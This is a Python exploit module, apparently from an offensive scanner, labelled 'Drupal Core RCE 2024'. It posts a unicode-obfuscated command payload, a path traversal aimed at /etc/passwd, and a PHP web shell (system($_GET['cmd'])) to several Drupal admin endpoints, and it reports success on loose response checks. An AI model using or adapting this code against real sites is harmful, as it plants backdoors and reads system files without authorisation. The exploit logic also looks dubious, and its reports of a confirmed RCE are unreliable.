import requests
from core.printmodels import *
import json

class Drupal_Core_RCE_2024:
    def __init__(self):
        self.name = "Drupal Core RCE 2024"
        self.description = "Drupal Core Remote Code Execution"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-CSRF-Token': 'mrphoenix'
            }

            # Multiple attack vectors
            payloads = [
                {
                    "query": "\u0070\u0072\u0069\u006E\u0074\u0028\u0060\u0069\u0064\u0060\u0029\u003B",
                    "_format": "json",
                    "link_type": "menu",
                    "link_id": "../../../../../../../etc/passwd%00"
                },
                {
                    "form_id": "system_site_information_settings",
                    "op": "Save configuration",
                    "site_name": "<?php system($_GET['cmd']); ?>"
                }
            ]

            endpoints = [
                f"{site}/admin/config/development/configuration/sync/import",
                f"{site}/admin/config/development/php",
                f"{site}/admin/structure/views/ajax/preview/who_s_new/page_1"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('success' in response.text.lower() or 'root:' in response.text):
                        return PrintSuccess(f"[Drupal-Core-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[Drupal-Core-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Drupal-Core-2024] Error: {str(e)}")
